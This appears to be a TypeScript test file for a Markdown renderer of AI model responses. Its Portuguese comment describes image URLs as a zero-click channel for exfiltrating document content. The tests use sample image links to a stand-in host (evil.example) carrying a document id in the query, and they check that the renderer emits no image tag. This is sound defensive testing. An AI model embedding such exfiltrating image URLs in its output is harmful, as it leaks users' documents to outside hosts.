import { describe, expect, it } from "bun:test"
import { createElement } from "react"
import { renderToStaticMarkup } from "react-dom/server"
import { Markdown } from "./markdown"

/**
 * Imagem em resposta de modelo é canal de exfiltração: o navegador busca a URL sem clique,
 * e a URL pode carregar trecho do documento na query. O renderizador não pode emitir `<img>`.
 */
const render = (markdown: string) => renderToStaticMarkup(createElement(Markdown, null, markdown))

describe("Markdown de modelo", () => {
	it("não emite <img> para imagem Markdown — mostra o texto alternativo", () => {
		const html = render("Veja ![segredo](https://evil.example/x.png?d=oficio-123)")
		expect(html).not.toContain("<img")
		expect(html).not.toContain("evil.example")
		expect(html).toContain("[imagem: segredo]")
	})

	it("imagem por referência também não carrega", () => {
		const html = render("![][ref]\n\n[ref]: https://evil.example/y.png")
		expect(html).not.toContain("<img")
	})

	it("link continua link (exige clique)", () => {
		const html = render("[norma](https://www.fab.mil.br)")
		expect(html).toContain('href="https://www.fab.mil.br"')
	})
})
